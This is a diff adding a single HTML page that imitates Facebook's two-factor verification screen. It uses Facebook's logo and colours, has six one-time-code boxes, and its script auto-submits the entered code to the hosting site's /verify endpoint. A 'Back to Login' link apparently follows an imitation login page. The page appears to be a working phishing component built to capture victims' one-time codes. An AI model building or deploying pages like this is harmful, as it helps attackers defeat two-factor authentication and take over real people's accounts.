@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#fff}.container{width:100%;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+.logo{margin-top:45px}.logo img{width:70px}.box{width:90%;max-width:360px;margin-top:50px}
+.box h2{font-size:22px;margin-bottom:12px}.box p{color:#666;line-height:24px;margin-bottom:28px;font-size:16px}
+.otp{display:flex;gap:8px;justify-content:space-between;width:100%}
+.otp input{width:calc((100% - 40px)/6);max-width:55px;height:58px;border:1px solid #ccd0d5;border-radius:14px;text-align:center;font-size:24px;outline:none}
+.otp input:focus{border:2px solid #1877f2}.verify{margin-top:30px}
+.verify button{width:100%;height:55px;border:none;border-radius:30px;background:#1877f2;color:#fff;font-size:20px;font-weight:bold;cursor:pointer}
+.verify button:hover{background:#166fe5}.timer{margin-top:15px;text-align:center;color:#888;font-size:15px}
+.resend,.back{text-align:center}.resend{margin-top:22px}.back{margin-top:16px}
+.resend a{color:#1877f2;text-decoration:none;font-size:17px}.back a{color:#555;text-decoration:none;font-size:16px}
+</style></head><body>
+<div class="container"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"></div>
+<div class="box"><h2>Enter verification code</h2><p>We've sent a 6-digit verification code to your mobile number. Please enter it below.</p>
+<form id="otpForm" action="/verify" method="POST">
+<div class="otp">
+<input type="tel" name="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="one-time-code">
+<input type="tel" name="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+<input type="tel" name="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+<input type="tel" name="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+<input type="tel" name="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+<input type="tel" name="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+</div><div class="verify"><button type="submit">Verify</button></div></form>
+
+<div class="resend"><a href="#">Resend Code</a></div>
+<div class="back"><a href="/">← Back to Login</a></div></div></div>
+<script>
+const inputs=[...document.querySelectorAll('.otp input')],form=document.getElementById('otpForm');
+function submitIfDone(){if(inputs.every(i=>i.value.length===1))form.submit();}
+inputs.forEach((inp,i)=>{
+inp.addEventListener('input',e=>{inp.value=inp.value.replace(/\D/g,'').slice(0,1);if(inp.value&&i<inputs.length-1)inputs[i+1].focus();submitIfDone();});
+inp.addEventListener('keydown',e=>{
+if(e.key==='Backspace'){if(inp.value){inp.value='';e.preventDefault();}else if(i>0){inputs[i-1].focus();inputs[i-1].value='';e.preventDefault();}}
+if(e.key==='ArrowLeft'&&i>0){inputs[i-1].focus();e.preventDefault();}
+if(e.key==='ArrowRight'&&i<inputs.length-1){inputs[i+1].focus();e.preventDefault();}
+if(e.key==='Enter'){e.preventDefault();submitIfDone();}
+});
+});
+inputs[0].addEventListener('paste',e=>{
+e.preventDefault();
+const d=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+d.split('').forEach((c,i)=>inputs[i].value=c);submitIfDone();
+});
+</script></body></html>
